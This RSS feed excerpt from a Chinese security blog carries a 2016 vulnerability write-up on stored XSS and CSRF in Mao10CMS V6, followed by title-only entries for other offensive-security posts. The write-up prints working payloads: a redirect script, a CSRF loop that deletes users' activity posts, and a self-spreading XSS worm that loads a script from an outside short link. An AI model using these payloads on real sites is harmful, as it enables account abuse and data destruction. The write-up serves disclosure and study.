    
      
      <item>
        <title>Mao10CMS V6 两处过滤不严可导致XSS、CSRF、XSS Wrom</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

&lt;p&gt;虽然手速没有别人快，漏洞也比较简单，还是把过程贴出来慢慢努力吧&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;官网v6.1.6版本，&lt;a href=&quot;http://www.mao10.com/?m=post&amp;amp;a=single&amp;amp;id=44&quot;&gt;http://www.mao10.com/?m=post&amp;amp;a=single&amp;amp;id=44&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;测试环境docker wnameless/mysql-phpmyadmin(apache2，php5，mysql5)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于该cms第一个注册的用户默认是管理员账户权限较大，其他用户再未特殊的设置下均为普通账户，在测试时需加以注意。（如下说明中admin为管理员账户，larry0x为普通账户）&lt;/p&gt;

&lt;h1 id=&quot;x01-xss&quot;&gt;0x01 第一处XSS&lt;/h1&gt;

&lt;p&gt;在黑盒测试当中，普通用户登陆后在进入个人主界面，在发表动态处未对输入及输出进行过滤，可导致客户端的代码攻击：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;黑盒逆向追踪源代码分析如下：&lt;/p&gt;

&lt;p&gt;右键源代码之后可以发现232~244为form表单进行动态内容的提交&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在do/activity.php的1~17行有：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其中将post的content直接传递进入hmset进行数据库的操作，跟进在mysql.php中的409~439行讲保存数据的数组进行了自定义的序列化之后插入数据库：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跟进do/function.php的50~57行，这里只是简单得序列化压缩编码保存进入了数据库：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此我们的恶意输入已经保存在了服务器上。&lt;/p&gt;

&lt;p&gt;由于所有的用户动态都会反应在页面坐下脚的“最新动态的面板”当中，让我们继续看看此处的输出是否有过滤。&lt;/p&gt;

&lt;p&gt;在全局搜索“最新动态”的div的class名“activityShowList”，可发现该模板页面在theme/default/activity.php当中，再次全局搜索activity.php的调用，发现theme/default/footer.php会对其进行包含，而footer.php在模板页面中均会被包含。&lt;/p&gt;

&lt;p&gt;下面定位到theme/default/activity.php的1~39行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其会取出最近5次的用户动态，并在第35行中调用hget方法对动态的内容进行输出。&lt;/p&gt;

&lt;p&gt;在mysql.php的366~372行当中也是对其内容反序列化后就返回结果，最终传递到模板当中：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以整个参数的传递过程中从入库到出库都未进行过滤直接输出后即可导致恶意的客户端代码执行。&lt;/p&gt;

&lt;h1 id=&quot;x02-xss&quot;&gt;0x02 第二处XSS&lt;/h1&gt;

&lt;p&gt;第二处的XSS存在与发布文字的话题处，此处可由用户创建任意的话题，此处也未对恶意输入进行过滤并输出，进而导致客户端代码的可执行性，在查看文章和主页显示最新文章时都可触发：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;首先在发布文章处右键源代码，定位到486~517为创建话题的form表单：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;随后跟进到do/pubform-topic.php文件中，在1~37当中：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于没有POST id值，直接进入21行的逻辑，虽然在第26,27行对提交的内容有严格的过滤，并在29行对数据进行序列化存储到数据库当中。但注意到在第25行则是直接对POST的话题title插入到zset表当中，而未进行任何过滤：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于最后的输出点在主页的热门文章当中，我们来看看输出情况是如何的，定位到theme/default/index.php中的56~62行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在58行中通过maoo_term_title获取文章话题的title，跟进do/function.php的918~926行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里直接通过zscore函数从zset表中获取对应的content，最后输出到页面中：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;x03-&quot;&gt;0x03 危害&lt;/h1&gt;

&lt;p&gt;以下均已最新动态的处的xss为例，当然在热门文章处也是可以利用触发的，原理相同&lt;/p&gt;

&lt;h2 id=&quot;xss&quot;&gt;XSS&lt;/h2&gt;

&lt;p&gt;最简单的打cookie喽：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过在利用时会有一些限制，在do/function.php的426~497行当中：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里使用token登陆我是没有找到其他的逻辑，所以就受限于485行的验证ip了，若达不到ip的话就只能进行IP伪造（该cms存在该缺陷）去暴力了&lt;/p&gt;

&lt;p&gt;其他有趣的玩法比如插入&lt;code&gt;&amp;lt;script&amp;gt;document.location=&quot;http://www.baidu.com&quot;;&amp;lt;/script&amp;gt;&lt;/code&gt;就可以“恶意跳转”啦，其他的可以自己发挥～&lt;/p&gt;

&lt;h2 id=&quot;csrf&quot;&gt;CSRF&lt;/h2&gt;

&lt;p&gt;在这里附送一个CSRF，在用户主页当中，存在一个删除用户动态的链接：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接着让我们定位到do/delete.php的229~238行：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在第231行虽然对权限进行了判定，只有管理员可以删除，但是并未对来源进行限制，因此可以对管理员进行CSRF攻击删除所有用户的动态信息，利用代码类似如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//skip itself}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://localhost:8080/mao10cms-mysql/do/delete.php?type=activity&amp;amp;id=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;xss-worm&quot;&gt;XSS Worm&lt;/h2&gt;

&lt;p&gt;由于在最新动态处都会显示最新的5条动态信息，并且是包含在模板页面当中的，也就说任何用户登陆后即可加载我们插入的js，进行恶意操作，这里我以关注对应用户和发布动态（维持Worm状态）为例，js代码如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/add_guanzhu.php?id=2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByTagName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;link&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/../../../do/activity.php&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;content=hi%3Cscript%20src%3D%27http%3A%2f%2ft.cn%2fRch1cI9%27%3E%3C%2fscript%3E&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Microsoft.XMLHTTP&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-type&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;application/x-www-form-urlencoded&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;ajax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;post_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160831/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
        
        <pubDate>Wed, 31 Aug 2016 00:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/mao10cms-v6-xss.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/mao10cms-v6-xss.html</guid>
      </item>
      
    
      
      <item>
        <title>不插电 · WooYun Puzzle#3 Write up</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

</description>
        
        <pubDate>Tue, 28 Jun 2016 08:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/wooyun-pluzze-3-write-up.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/wooyun-pluzze-3-write-up.html</guid>
      </item>
      
    
      
      <item>
        <title>TFTP反射放大攻击浅析</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

</description>
        
        <pubDate>Wed, 23 Mar 2016 06:30:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/tftp-reflection-and-amplification-attack.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/tftp-reflection-and-amplification-attack.html</guid>
      </item>
      
    
      
      <item>
        <title>Python远控Pupy使用帮助</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

</description>
        
        <pubDate>Thu, 08 Oct 2015 15:00:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/pupy-first-touch-101.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/pupy-first-touch-101.html</guid>
      </item>
      
    
      
      <item>
        <title>DNS域传送漏洞学习总结</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;

</description>
        
        <pubDate>Wed, 02 Sep 2015 09:30:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/DNS-zone-transfer-studying.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/DNS-zone-transfer-studying.html</guid>
      </item>
      
    
      
      <item>
        <title>CBC字节翻转攻击-101Approach</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 译者前言&lt;/h1&gt;

</description>
        
        <pubDate>Sat, 08 Aug 2015 14:30:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/cbc-byte-flipping-attack-101-approach-studying.html</guid>
      </item>
      
    
      
      <item>
        <title>基础级Google Hacking</title>
        
          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 引言&lt;/h1&gt;

</description>
        
        <pubDate>Fri, 27 Mar 2015 20:38:00 -0400</pubDate>
        <link>
        https://larryxi.github.io/basic-google-hacking.html</link>
        <guid isPermaLink="true">https://larryxi.github.io/basic-google-hacking.html</guid>
      </item>
      
    
  </channel>
</rss>
